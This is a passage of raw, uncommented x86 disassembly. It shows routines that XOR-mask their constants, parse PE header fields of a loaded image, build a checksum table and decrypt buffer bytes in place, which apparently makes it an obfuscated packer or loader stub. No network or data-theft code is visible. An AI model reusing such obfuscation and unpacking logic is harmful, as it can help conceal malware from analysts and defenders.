  4281ed:	xor    esi,ecx
  4281ef:	jmp    0x4281fb
  4281f1:	xor    esi,eax
  4281f3:	xor    ecx,eax
  4281f5:	add    esi,edx
  4281f7:	add    ecx,edx
  4281f9:	shr    esi,cl
  4281fb:	mov    DWORD PTR [ebp-0x8],esi
  4281fe:	mov    ecx,DWORD PTR [ebp-0x4]
  428201:	xor    ecx,eax
  428203:	lea    edi,[edi+ecx*1+0x3272f1]
  42820a:	mov    ecx,DWORD PTR [ebp-0xc]
  42820d:	mov    esi,DWORD PTR [ebp-0x4]
  428210:	xor    esi,eax
  428212:	xor    ecx,eax
  428214:	sub    ecx,esi
  428216:	cmp    edi,ecx
  428218:	jbe    0x4281c4
  42821a:	mov    eax,DWORD PTR [ebp-0x8]
  42821d:	pop    edi
  42821e:	mov    DWORD PTR [ebx],eax
  428220:	mov    eax,DWORD PTR [ebp-0x8]
  428223:	pop    esi
  428224:	leave  
  428225:	ret    
  428226:	push   ebp
  428227:	mov    ebp,esp
  428229:	sub    esp,0x38
  42822c:	push   ebx
  42822d:	mov    ebx,0xf89c85a5
  428232:	mov    DWORD PTR [ebp-0x4],ebx
  428235:	lea    ecx,[ebx+0x15]
  428238:	mov    DWORD PTR [ebp-0x24],ecx
  42823b:	mov    eax,DWORD PTR [ebp-0x4]
  42823e:	mov    edx,DWORD PTR [ebp+0x8]
  428241:	push   esi
  428242:	mov    esi,0x75108aa
  428247:	xor    eax,esi
  428249:	push   edi
  42824a:	mov    edi,0x3272f1
  42824f:	add    eax,edi
  428251:	cmp    edx,eax
  428253:	mov    eax,DWORD PTR [ebp-0x4]
  428256:	je     0x4283ba
  42825c:	mov    edx,DWORD PTR [ebp+0xc]
  42825f:	xor    eax,esi
  428261:	add    eax,edi
  428263:	cmp    edx,eax
  428265:	je     0x4283b7
  42826b:	mov    eax,DWORD PTR [ebp+0x10]
  42826e:	mov    edx,DWORD PTR [ebp+0xc]
  428271:	mov    DWORD PTR [ebp-0x14],eax
  428274:	mov    eax,DWORD PTR [ebp+0x8]
  428277:	mov    DWORD PTR [ebp-0x18],0xf89c853f
  42827e:	mov    DWORD PTR [ebp-0xc],eax
  428281:	lea    eax,[ebx+0x16]
  428284:	mov    DWORD PTR [ebp-0x1c],eax
  428287:	mov    DWORD PTR [ebp-0x10],ebx
  42828a:	mov    DWORD PTR [ebp+0xc],ecx
  42828d:	mov    DWORD PTR [ebp+0x10],eax
  428290:	mov    eax,DWORD PTR [ebp+0xc]
  428293:	xor    eax,esi
  428295:	mov    DWORD PTR [ebp-0x20],edx
  428298:	sub    edx,eax
  42829a:	sub    edx,edi
  42829c:	mov    DWORD PTR [ebp+0x8],edx
  42829f:	mov    DWORD PTR [ebp-0x8],0xf89c85be
  4282a6:	jmp    0x4283a7
  4282ab:	mov    eax,DWORD PTR [ebp+0xc]
  4282ae:	mov    ecx,DWORD PTR [ebp+0xc]
  4282b1:	xor    eax,esi
  4282b3:	xor    ecx,esi
  4282b5:	lea    ecx,[eax+ecx*1+0x64e5e2]
  4282bc:	mov    eax,DWORD PTR [ebp+0x8]
  4282bf:	xor    edx,edx
  4282c1:	div    ecx
  4282c3:	mov    eax,DWORD PTR [ebp+0x10]
  4282c6:	mov    ecx,DWORD PTR [ebp+0xc]
  4282c9:	xor    eax,esi
  4282cb:	xor    ecx,esi
  4282cd:	sub    eax,ecx
  4282cf:	cmp    edx,eax
  4282d1:	jne    0x428366
  4282d7:	mov    eax,DWORD PTR [ebp+0x8]
  4282da:	mov    ecx,DWORD PTR [ebp-0xc]
  4282dd:	mov    dl,BYTE PTR [eax+ecx*1]
  4282e0:	mov    eax,DWORD PTR [ebp-0x10]
  4282e3:	mov    ecx,DWORD PTR [ebp-0x8]
  4282e6:	xor    eax,esi
  4282e8:	xor    ecx,esi
  4282ea:	add    eax,edi
  4282ec:	add    ecx,edi
  4282ee:	cmp    eax,ecx
  4282f0:	jae    0x428338
  4282f2:	lea    ecx,[eax-0x3272f1]
  4282f8:	mov    DWORD PTR [ebp-0x4],ecx
  4282fb:	mov    ebx,DWORD PTR [ebp-0x4]
  4282fe:	xor    ebx,esi
  428300:	add    ebx,0x7f55d8fb
  428306:	lea    ecx,[ebp+eax*4-0x38]
  42830a:	mov    DWORD PTR [ecx],ebx
  42830c:	mov    ebx,DWORD PTR [ecx]
  42830e:	cmp    ebx,0x244ecb98
  428314:	jbe    0x42831e
  428316:	add    DWORD PTR [ecx],0x405fcd9
  42831c:	jmp    0x428324
  42831e:	add    DWORD PTR [ecx],0xfdaf4327
  428324:	mov    ecx,DWORD PTR [ebp-0x8]
  428327:	xor    ecx,esi
  428329:	inc    eax
  42832a:	inc    DWORD PTR [ebp-0x4]
  42832d:	add    ecx,edi
  42832f:	cmp    eax,ecx
  428331:	jb     0x4282fb
  428333:	mov    ebx,0xf89c85a5
  428338:	cmp    DWORD PTR [ebp-0x14],0x0
  42833c:	jne    0x428345
  42833e:	xor    dl,0x7c
  428341:	inc    dl
  428343:	jmp    0x42835b
  428345:	mov    eax,DWORD PTR [ebp-0x18]
  428348:	xor    al,0xaa
  42834a:	mov    cl,0xf
  42834c:	sub    cl,al
  42834e:	add    dl,cl
  428350:	mov    ecx,DWORD PTR [ebp-0x1c]
  428353:	xor    cl,0xaa
  428356:	sub    cl,0xf
  428359:	ror    dl,cl
  42835b:	xor    eax,eax
  42835d:	mov    eax,DWORD PTR [ebp+0x8]
  428360:	mov    ecx,DWORD PTR [ebp-0xc]
  428363:	mov    BYTE PTR [eax+ecx*1],dl
  428366:	mov    eax,DWORD PTR [ebp+0x8]
  428369:	mov    ecx,DWORD PTR [ebp-0x10]
  42836c:	sub    eax,edi
  42836e:	xor    eax,esi
  428370:	cmp    eax,ecx
  428372:	jne    0x428395
  428374:	mov    eax,DWORD PTR [ebp+0x10]
  428377:	mov    ecx,DWORD PTR [ebp+0xc]
  42837a:	xor    eax,esi
  42837c:	xor    ecx,esi
  42837e:	sub    eax,ecx
  428380:	mov    ecx,DWORD PTR [ebp-0x20]
  428383:	sub    eax,edi
  428385:	xor    eax,esi
  428387:	mov    DWORD PTR [ebp+0x10],eax
  42838a:	mov    eax,DWORD PTR [ebp+0xc]
  42838d:	xor    eax,esi
  42838f:	sub    ecx,eax
  428391:	sub    ecx,edi
  428393:	jmp    0x4283a4
  428395:	mov    eax,DWORD PTR [ebp+0xc]
  428398:	xor    eax,esi
  42839a:	mov    ecx,0xffcd8d0f
  42839f:	sub    ecx,eax
  4283a1:	add    ecx,DWORD PTR [ebp+0x8]
  4283a4:	mov    DWORD PTR [ebp+0x8],ecx
  4283a7:	mov    eax,DWORD PTR [ebp+0x10]
  4283aa:	cmp    eax,ebx
  4283ac:	jne    0x4282ab
  4283b2:	mov    eax,DWORD PTR [ebp-0x24]
  4283b5:	jmp    0x4283ba
  4283b7:	mov    eax,DWORD PTR [ebp-0x4]
  4283ba:	xor    eax,esi
  4283bc:	add    eax,edi
  4283be:	pop    edi
  4283bf:	pop    esi
  4283c0:	pop    ebx
  4283c1:	leave  
  4283c2:	ret    0xc
  4283c5:	push   ebp
  4283c6:	mov    ebp,esp
  4283c8:	sub    esp,0x420
  4283ce:	mov    DWORD PTR [ebp-0x14],0xf89c85a5
  4283d5:	mov    DWORD PTR [ebp-0xc],0xf89c85ba
  4283dc:	mov    DWORD PTR [ebp-0x18],0xf89c86a5
  4283e3:	push   ebx
  4283e4:	mov    DWORD PTR [ebp-0x1c],0xf89c85a4
  4283eb:	mov    eax,DWORD PTR [ebp-0x14]
  4283ee:	push   esi
  4283ef:	mov    esi,0x75108aa
  4283f4:	push   edi
  4283f5:	xor    eax,esi
  4283f7:	mov    edi,0x3272f1
  4283fc:	add    eax,edi
  4283fe:	mov    DWORD PTR [ebp-0x8],eax
  428401:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  428408:	mov    DWORD PTR [ebp-0x4],0xead71885
  42840f:	mov    DWORD PTR [ebp-0x10],0x8
  428416:	mov    ecx,ecx
  428418:	mov    eax,DWORD PTR [ebp-0xc]
  42841b:	mov    ecx,DWORD PTR [ebp-0x14]
  42841e:	xor    eax,esi
  428420:	xor    ecx,esi
  428422:	add    eax,edi
  428424:	add    ecx,edi
  428426:	imul   eax,ecx
  428429:	jmp    0x42845c
  42842b:	mov    eax,DWORD PTR [ebp-0x4]
  42842e:	sub    eax,edi
  428430:	xor    eax,esi
  428432:	mov    DWORD PTR [ebp-0x8],eax
  428435:	lea    ebx,[ebp-0x8]
  428438:	call   0x42817e
  42843d:	mov    DWORD PTR [ebp-0x8],eax
  428440:	mov    eax,DWORD PTR [ebp-0x8]
  428443:	mov    ecx,DWORD PTR [ebp-0x4]
  428446:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  42844d:	mov    eax,DWORD PTR [ebp-0xc]
  428450:	mov    ecx,DWORD PTR [ebp-0x4]
  428453:	xor    eax,esi
  428455:	lea    eax,[eax+ecx*1+0x3272f1]
  42845c:	mov    DWORD PTR [ebp-0x4],eax
  42845f:	mov    eax,DWORD PTR [ebp-0x18]
  428462:	mov    ecx,DWORD PTR [ebp-0xc]
  428465:	xor    ecx,esi
  428467:	xor    eax,esi
  428469:	sub    eax,ecx
  42846b:	mov    ecx,DWORD PTR [ebp-0x4]
  42846e:	cmp    ecx,eax
  428470:	jbe    0x42842b
  428472:	mov    eax,DWORD PTR [ebp-0x1c]
  428475:	xor    eax,esi
  428477:	add    eax,edi
  428479:	mov    DWORD PTR [ebp-0x8],eax
  42847c:	mov    DWORD PTR [ebp-0x18],0xf89c86a4
  428483:	mov    ebx,ebx
  428485:	jmp    0x4284e8
  428487:	mov    ecx,DWORD PTR [ebp-0x20]
  42848a:	mov    eax,DWORD PTR [ebp-0x8]
  42848d:	xor    ecx,esi
  42848f:	add    ecx,edi
  428491:	shr    eax,cl
  428493:	mov    DWORD PTR [ebp-0x4],eax
  428496:	mov    eax,DWORD PTR [ebp+0x8]
  428499:	mov    cl,BYTE PTR [eax]
  42849b:	mov    BYTE PTR [ebp+0xb],cl
  42849e:	mov    cl,BYTE PTR [ebp+0xb]
  4284a1:	mov    edx,DWORD PTR [ebp-0x8]
  4284a4:	movzx  ecx,cl
  4284a7:	xor    ecx,edx
  4284a9:	mov    DWORD PTR [ebp+0x8],ecx
  4284ac:	mov    ecx,DWORD PTR [ebp-0x18]
  4284af:	mov    edx,DWORD PTR [ebp+0x8]
  4284b2:	xor    ecx,esi
  4284b4:	add    ecx,edi
  4284b6:	and    ecx,edx
  4284b8:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  4284bf:	mov    edx,DWORD PTR [ebp-0x4]
  4284c2:	xor    ecx,edx
  4284c4:	mov    DWORD PTR [ebp-0x8],ecx
  4284c7:	mov    ecx,DWORD PTR [ebp-0xc]
  4284ca:	xor    ecx,esi
  4284cc:	lea    eax,[eax+ecx*1+0x3272f1]
  4284d3:	mov    DWORD PTR [ebp+0x8],eax
  4284d6:	mov    eax,DWORD PTR [ebp-0xc]
  4284d9:	xor    eax,esi
  4284db:	mov    ecx,0xffcd8d0f
  4284e0:	sub    ecx,eax
  4284e2:	add    ecx,DWORD PTR [ebp-0x10]
  4284e5:	mov    DWORD PTR [ebp-0x10],ecx
  4284e8:	mov    eax,DWORD PTR [ebp-0x14]
  4284eb:	mov    ecx,DWORD PTR [ebp-0x10]
  4284ee:	xor    eax,esi
  4284f0:	add    eax,edi
  4284f2:	cmp    ecx,eax
  4284f4:	jne    0x428487
  4284f6:	mov    eax,DWORD PTR [ebp-0x1c]
  4284f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4284fc:	xor    eax,esi
  4284fe:	add    eax,edi
  428500:	pop    edi
  428501:	pop    esi
  428502:	xor    eax,ecx
  428504:	pop    ebx
  428505:	leave  
  428506:	ret    0x4
  428509:	push   ebp
  42850a:	mov    ebp,esp
  42850c:	mov    eax,DWORD PTR [ebp+0x1c]
  42850f:	mov    ecx,DWORD PTR [ebp+0x8]
  428512:	mov    edx,DWORD PTR [ebp+0x10]
  428515:	mov    eax,DWORD PTR [eax+0x190]
  42851b:	mov    eax,DWORD PTR [eax]
  42851d:	sub    esp,0x64
  428520:	push   ebx
  428521:	push   esi
  428522:	push   edi
  428523:	mov    edi,0x75108aa
  428528:	xor    ecx,edi
  42852a:	mov    ebx,0x3272f1
  42852f:	add    ecx,ebx
  428531:	cmp    ecx,edx
  428533:	jne    0x428544
  428535:	or     DWORD PTR ds:0x3750c3f,0x4263eb2c
  42853f:	jmp    0x428a40
  428544:	mov    ecx,DWORD PTR [ebp+0x8]
  428547:	mov    esi,DWORD PTR [ebp+0x14]
  42854a:	mov    edx,DWORD PTR [esi]
  42854c:	xor    ecx,edi
  42854e:	add    ecx,ebx
  428550:	cmp    edx,ecx
  428552:	je     0x4289fb
  428558:	mov    ecx,DWORD PTR [ebp+0x1c]
  42855b:	mov    DWORD PTR [ebp-0x1c],eax
  42855e:	mov    DWORD PTR [ebp+0x1c],ecx
  428561:	mov    ecx,DWORD PTR [ebp+0x18]
  428564:	mov    eax,DWORD PTR [esi]
  428566:	mov    DWORD PTR [ebp-0x20],eax
  428569:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  428570:	mov    edx,0xf89c85ba
  428575:	mov    DWORD PTR [ebp-0x8],edx
  428578:	mov    eax,DWORD PTR [ebp+0x1c]
  42857b:	mov    DWORD PTR [ebp+0x1c],eax
  42857e:	mov    eax,DWORD PTR [ebp+0x1c]
  428581:	mov    eax,DWORD PTR [eax+0x190]
  428587:	mov    eax,DWORD PTR [eax]
  428589:	mov    DWORD PTR [ebp-0x24],ecx
  42858c:	mov    ecx,DWORD PTR [ebp+0x1c]
  42858f:	mov    ecx,DWORD PTR [ecx+0x190]
  428595:	mov    ecx,DWORD PTR [ecx]
  428597:	add    ecx,DWORD PTR [eax+0x3c]
  42859a:	mov    DWORD PTR [ebp+0x10],ecx
  42859d:	mov    eax,DWORD PTR [ebp+0x8]
  4285a0:	xor    eax,edi
  4285a2:	add    eax,ebx
  4285a4:	mov    DWORD PTR [ebp-0x4],eax
  4285a7:	mov    eax,DWORD PTR [ebp+0x8]
  4285aa:	xor    eax,edi
  4285ac:	add    eax,ebx
  4285ae:	mov    DWORD PTR [ebp+0x18],eax
  4285b1:	mov    eax,DWORD PTR [ebp+0x10]
  4285b4:	mov    eax,DWORD PTR [eax+0x50]
  4285b7:	sub    eax,0xc
  4285ba:	mov    DWORD PTR [ebp-0x28],eax
  4285bd:	mov    eax,DWORD PTR [ebp+0x10]
  4285c0:	mov    eax,DWORD PTR [eax+0x38]
  4285c3:	mov    ecx,DWORD PTR [ebp+0x10]
  4285c6:	dec    eax
  4285c7:	test   DWORD PTR [ecx+0x54],eax
  4285ca:	mov    eax,DWORD PTR [ebp+0x10]
  4285cd:	je     0x4285e7
  4285cf:	mov    eax,DWORD PTR [eax+0x38]
  4285d2:	mov    ecx,DWORD PTR [ebp+0x10]
  4285d5:	mov    ecx,DWORD PTR [ecx+0x54]
  4285d8:	dec    eax
  4285d9:	not    eax
  4285db:	and    ecx,eax
  4285dd:	mov    eax,DWORD PTR [ebp+0x10]
  4285e0:	mov    eax,DWORD PTR [eax+0x38]
  4285e3:	add    eax,ecx
  4285e5:	jmp    0x4285ea
  4285e7:	mov    eax,DWORD PTR [eax+0x54]
  4285ea:	mov    DWORD PTR [ebp+0x1c],eax
  4285ed:	mov    eax,DWORD PTR [ebp+0x8]
  4285f0:	xor    eax,edi
  4285f2:	add    eax,ebx
  4285f4:	mov    DWORD PTR [ebp+0x18],eax
  4285f7:	mov    eax,DWORD PTR [ebp+0x8]
  4285fa:	xor    eax,edi
  4285fc:	add    eax,ebx
  4285fe:	mov    DWORD PTR [ebp+0x18],eax
  428601:	mov    eax,DWORD PTR [ebp+0x8]
  428604:	mov    ecx,DWORD PTR [ebp-0x24]
  428607:	xor    eax,edi
  428609:	add    eax,ebx
  42860b:	mov    DWORD PTR [ecx],eax
  42860d:	mov    DWORD PTR [ebp+0x18],edx
  428610:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  428617:	mov    DWORD PTR [ebp+0x18],0xf89c85b8
  42861e:	mov    DWORD PTR [ebp+0x18],0xf89c85b9
  428625:	mov    eax,DWORD PTR [ebp-0x8]
  428628:	mov    ecx,DWORD PTR [ebp+0x1c]
  42862b:	xor    eax,edi
  42862d:	add    eax,ebx
  42862f:	imul   eax,ecx
  428632:	mov    ecx,DWORD PTR [ebp+0x8]
  428635:	mov    edx,DWORD PTR [ebp-0x28]
  428638:	xor    ecx,edi
  42863a:	lea    ecx,[ecx+edx*1+0x3272f1]
  428641:	cmp    eax,ecx
  428643:	jae    0x4289f4
  428649:	mov    eax,DWORD PTR [ebp+0x8]
  42864c:	xor    eax,edi
  42864e:	add    eax,ebx
  428650:	mov    DWORD PTR [ebp+0x18],eax
  428653:	mov    eax,DWORD PTR [ebp+0x1c]
  428656:	add    eax,DWORD PTR [ebp-0x1c]
  428659:	mov    DWORD PTR [ebp-0x4],eax
  42865c:	push   DWORD PTR [ebp-0x4]
  42865f:	mov    esi,DWORD PTR [ebp-0x1c]
  428662:	mov    ecx,DWORD PTR [ebp+0x10]
  428665:	call   0x4277b9
  42866a:	mov    DWORD PTR [ebp+0xc],eax
  42866d:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  428674:	mov    eax,DWORD PTR [ebp-0x18]
  428677:	xor    eax,edi
  428679:	lea    ecx,[ebp-0x40]
  42867c:	add    eax,ebx
  42867e:	push   ecx
  42867f:	call   0x427d4b
  428684:	mov    eax,DWORD PTR [ebp+0xc]
  428687:	test   eax,eax
  428689:	je     0x4286d9
  42868b:	mov    eax,DWORD PTR [ebp-0x18]
  42868e:	xor    eax,edi
  428690:	add    eax,ebx
  428692:	push   eax
  428693:	push   DWORD PTR [ebp+0xc]
  428696:	lea    eax,[ebp-0x40]
  428699:	push   eax
  42869a:	call   0x427c41
  42869f:	mov    eax,DWORD PTR [ebp-0x4]
  4286a2:	mov    DWORD PTR [ebp-0x18],eax
  4286a5:	mov    eax,DWORD PTR [ebp-0x18]
  4286a8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4286ab:	sub    eax,ecx
  4286ad:	mov    DWORD PTR [ebp-0x18],eax
  4286b0:	mov    eax,DWORD PTR [ebp+0xc]
  4286b3:	mov    ecx,DWORD PTR [ebp+0xc]
  4286b6:	mov    eax,DWORD PTR [eax+0x10]
  4286b9:	add    eax,DWORD PTR [ecx+0xc]
  4286bc:	mov    ecx,DWORD PTR [ebp-0x18]
  4286bf:	cmp    ecx,eax
  4286c1:	jb     0x4286d9
  4286c3:	mov    eax,DWORD PTR [ebp+0xc]
  4286c6:	mov    eax,DWORD PTR [eax+0xc]
  4286c9:	mov    ecx,DWORD PTR [ebp+0xc]
  4286cc:	add    eax,DWORD PTR [ecx+0x8]
  4286cf:	mov    ecx,DWORD PTR [ebp-0x18]
  4286d2:	sub    eax,ecx
  4286d4:	jmp    0x4289c7
  4286d9:	push   0xc
  4286db:	push   DWORD PTR [ebp-0x4]
  4286de:	lea    eax,[ebp-0x4c]
  4286e1:	push   eax
  4286e2:	call   0x427c41
  4286e7:	mov    eax,0xf89c85a5
  4286ec:	mov    DWORD PTR [ebp-0x2c],eax
  4286ef:	mov    DWORD PTR [ebp-0x30],0xf89c85ba
  4286f6:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  4286fd:	mov    DWORD PTR [ebp-0x38],0xf89c85b8
  428704:	lea    ecx,[ebp-0x2c]
  428707:	mov    DWORD PTR [ebp-0xc],ecx
  42870a:	lea    ecx,[ebp-0x30]
  42870d:	mov    DWORD PTR [ebp-0x10],ecx
  428710:	lea    ecx,[ebp-0x34]
  428713:	mov    DWORD PTR [ebp+0xc],ecx
  428716:	lea    ecx,[ebp-0x38]
  428719:	mov    DWORD PTR [ebp-0x14],ecx
  42871c:	mov    ecx,DWORD PTR [ebp+0x8]
  42871f:	xor    ecx,edi
  428721:	add    ecx,ebx
  428723:	mov    DWORD PTR [ebp-0x18],ecx
  428726:	jmp    0x428922
  42872b:	cmp    eax,0xf89c85bb
  428730:	je     0x428934
  428736:	mov    ecx,DWORD PTR [ebp-0x8]
  428739:	xor    ecx,edi
  42873b:	mov    esi,eax
  42873d:	add    ecx,ebx
  42873f:	mov    DWORD PTR [ebp+0x18],ecx
  428742:	mov    eax,DWORD PTR [ebp-0x18]
  428745:	xor    esi,edi
  428747:	lea    eax,[eax+esi*1+0x3272f1]
  42874e:	mov    DWORD PTR [ebp-0x18],eax
  428751:	mov    eax,DWORD PTR [ebp-0x8]
  428754:	mov    ecx,DWORD PTR [ebp-0x18]
  428757:	xor    eax,edi
  428759:	add    eax,ebx
  42875b:	cmp    ecx,eax
  42875d:	jne    0x428772
  42875f:	mov    eax,DWORD PTR [ebp+0x8]
  428762:	xor    eax,edi
  428764:	add    eax,ebx
  428766:	push   eax
  428767:	push   0xc
  428769:	lea    eax,[ebp-0x4c]
  42876c:	push   eax
  42876d:	call   0x428226
  428772:	mov    eax,DWORD PTR [ebp-0xc]
  428775:	mov    eax,DWORD PTR [eax]
  428777:	xor    eax,edi
  428779:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  428780:	mov    ecx,DWORD PTR [ebp+0x8]
  428783:	xor    ecx,edi
  428785:	movzx  eax,al
  428788:	add    ecx,ebx
  42878a:	cmp    eax,ecx
  42878c:	je     0x42890a
  428792:	mov    eax,DWORD PTR [ebp-0x10]
  428795:	mov    eax,DWORD PTR [eax]
  428797:	xor    eax,edi
  428799:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  4287a0:	mov    ecx,DWORD PTR [ebp+0x8]
  4287a3:	xor    ecx,edi
  4287a5:	movzx  eax,al
  4287a8:	add    ecx,ebx
  4287aa:	cmp    eax,ecx
  4287ac:	je     0x42890a
  4287b2:	mov    eax,DWORD PTR [ebp+0xc]
  4287b5:	mov    eax,DWORD PTR [eax]
  4287b7:	xor    eax,edi
  4287b9:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  4287c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4287c3:	xor    ecx,edi
  4287c5:	movzx  eax,al
  4287c8:	add    ecx,ebx
  4287ca:	cmp    eax,ecx
  4287cc:	je     0x42890a
  4287d2:	mov    eax,DWORD PTR [ebp-0x14]
  4287d5:	mov    eax,DWORD PTR [eax]
  4287d7:	xor    eax,edi
  4287d9:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  4287e0:	mov    ecx,DWORD PTR [ebp+0x8]
  4287e3:	xor    ecx,edi
  4287e5:	movzx  eax,al
  4287e8:	add    ecx,ebx
  4287ea:	cmp    eax,ecx
  4287ec:	je     0x42890a
  4287f2:	mov    eax,DWORD PTR [ebp-0x10]
  4287f5:	mov    eax,DWORD PTR [eax]
  4287f7:	xor    eax,edi
  4287f9:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  428800:	mov    ecx,DWORD PTR [ebp-0xc]
  428803:	mov    ecx,DWORD PTR [ecx]
  428805:	xor    ecx,edi
  428807:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  42880e:	xor    al,cl
  428810:	mov    ecx,DWORD PTR [ebp+0xc]
  428813:	mov    ecx,DWORD PTR [ecx]
  428815:	xor    ecx,edi
  428817:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  42881e:	or     al,cl
  428820:	mov    ecx,DWORD PTR [ebp-0xc]
  428823:	mov    ecx,DWORD PTR [ecx]
  428825:	xor    ecx,edi
  428827:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  42882e:	cmp    cl,al
  428830:	jne    0x42890a
  428836:	mov    eax,DWORD PTR [ebp+0xc]
  428839:	mov    eax,DWORD PTR [eax]
  42883b:	xor    eax,edi
  42883d:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  428844:	mov    ecx,DWORD PTR [ebp-0x10]
  428847:	mov    ecx,DWORD PTR [ecx]
  428849:	xor    ecx,edi
  42884b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  428852:	xor    al,cl
  428854:	mov    ecx,DWORD PTR [ebp-0x14]
  428857:	mov    ecx,DWORD PTR [ecx]
  428859:	xor    ecx,edi
  42885b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  428862:	or     al,cl
  428864:	mov    ecx,DWORD PTR [ebp-0x10]
  428867:	mov    ecx,DWORD PTR [ecx]
  428869:	xor    ecx,edi
  42886b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428872:	cmp    cl,al
  428874:	jne    0x42890a
  42887a:	mov    eax,DWORD PTR [ebp-0x14]
  42887d:	mov    eax,DWORD PTR [eax]
  42887f:	xor    eax,edi
  428881:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  428888:	mov    ecx,DWORD PTR [ebp+0xc]
  42888b:	mov    ecx,DWORD PTR [ecx]
  42888d:	xor    ecx,edi
  42888f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  428896:	xor    al,cl
  428898:	mov    ecx,DWORD PTR [ebp-0xc]
  42889b:	mov    ecx,DWORD PTR [ecx]
  42889d:	xor    ecx,edi
  42889f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  4288a6:	or     al,cl
  4288a8:	mov    ecx,DWORD PTR [ebp+0xc]
  4288ab:	mov    ecx,DWORD PTR [ecx]
  4288ad:	xor    ecx,edi
  4288af:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  4288b6:	cmp    cl,al
  4288b8:	jne    0x42890a
  4288ba:	mov    eax,DWORD PTR [ebp-0x14]
  4288bd:	mov    eax,DWORD PTR [eax]
  4288bf:	xor    eax,edi
  4288c1:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  4288c8:	mov    ecx,DWORD PTR [ebp-0xc]
  4288cb:	mov    ecx,DWORD PTR [ecx]
  4288cd:	xor    ecx,edi
  4288cf:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  4288d6:	xor    al,cl
  4288d8:	mov    ecx,DWORD PTR [ebp-0x10]
  4288db:	mov    ecx,DWORD PTR [ecx]
  4288dd:	xor    ecx,edi
  4288df:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  4288e6:	or     al,cl
  4288e8:	mov    ecx,DWORD PTR [ebp-0x14]
  4288eb:	mov    ecx,DWORD PTR [ecx]
  4288ed:	xor    ecx,edi
  4288ef:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  4288f6:	cmp    cl,al
  4288f8:	jne    0x42890a
  4288fa:	lea    eax,[ebp-0x4c]
  4288fd:	push   eax
  4288fe:	call   0x4283c5
  428903:	mov    ecx,DWORD PTR [ebp-0x44]
  428906:	cmp    eax,ecx
  428908:	je     0x428914
  42890a:	mov    eax,DWORD PTR [ebp+0x8]
  42890d:	xor    eax,edi
  42890f:	add    eax,ebx
  428911:	mov    DWORD PTR [ebp+0x18],eax
  428914:	mov    eax,DWORD PTR [ebp-0x8]
  428917:	xor    eax,edi
  428919:	lea    eax,[eax+esi*1+0x3272f1]
  428920:	xor    eax,edi
  428922:	mov    ecx,DWORD PTR [ebp+0x8]
  428925:	mov    edx,DWORD PTR [ebp+0x18]
  428928:	xor    ecx,edi
  42892a:	add    ecx,ebx
  42892c:	cmp    edx,ecx
  42892e:	je     0x42872b
  428934:	mov    eax,DWORD PTR [ebp+0x8]
  428937:	mov    ecx,DWORD PTR [ebp+0x18]
  42893a:	xor    eax,edi
  42893c:	add    eax,ebx
  42893e:	cmp    ecx,eax
  428940:	jne    0x428953
  428942:	mov    eax,DWORD PTR [ebp-0x8]
  428945:	mov    ecx,DWORD PTR [ebp+0x1c]
  428948:	xor    eax,edi
  42894a:	lea    eax,[eax+ecx*1+0x3272f1]
  428951:	jmp    0x4289ca
  428953:	push   0x18
  428955:	push   DWORD PTR [ebp-0x4]
  428958:	lea    eax,[ebp-0x64]
  42895b:	push   eax
  42895c:	call   0x427c41
  428961:	mov    eax,DWORD PTR [ebp+0x8]
  428964:	mov    ecx,DWORD PTR [ebp-0x18]
  428967:	xor    eax,edi
  428969:	add    eax,ebx
  42896b:	cmp    eax,ecx
  42896d:	je     0x428982
  42896f:	mov    eax,DWORD PTR [ebp+0x8]
  428972:	xor    eax,edi
  428974:	add    eax,ebx
  428976:	push   eax
  428977:	push   0x18
  428979:	lea    eax,[ebp-0x64]
  42897c:	push   eax
  42897d:	call   0x428226
  428982:	mov    eax,DWORD PTR [ebp-0x4]
  428985:	add    eax,0x18
  428988:	mov    DWORD PTR [ebp+0x18],eax
  42898b:	push   DWORD PTR [ebp-0x50]
  42898e:	push   DWORD PTR [ebp+0x18]
  428991:	mov    eax,DWORD PTR [ebp-0x54]
  428994:	add    eax,DWORD PTR [ebp-0x20]
  428997:	push   eax
  428998:	call   0x427c41
  42899d:	mov    eax,DWORD PTR [ebp+0x8]
  4289a0:	mov    ecx,DWORD PTR [ebp-0x18]
  4289a3:	xor    eax,edi
  4289a5:	add    eax,ebx
  4289a7:	cmp    eax,ecx
  4289a9:	je     0x4289bc
  4289ab:	push   0x0
  4289ad:	push   DWORD PTR [ebp-0x50]
  4289b0:	mov    eax,DWORD PTR [ebp-0x54]
  4289b3:	add    eax,DWORD PTR [ebp-0x20]
  4289b6:	push   eax
  4289b7:	call   0x428226
  4289bc:	mov    eax,DWORD PTR [ebp-0x24]
  4289bf:	mov    ecx,DWORD PTR [ebp-0x50]
  4289c2:	add    DWORD PTR [eax],ecx
  4289c4:	mov    eax,DWORD PTR [ebp-0x50]
  4289c7:	add    eax,DWORD PTR [ebp+0x1c]
  4289ca:	mov    DWORD PTR [ebp+0x1c],eax
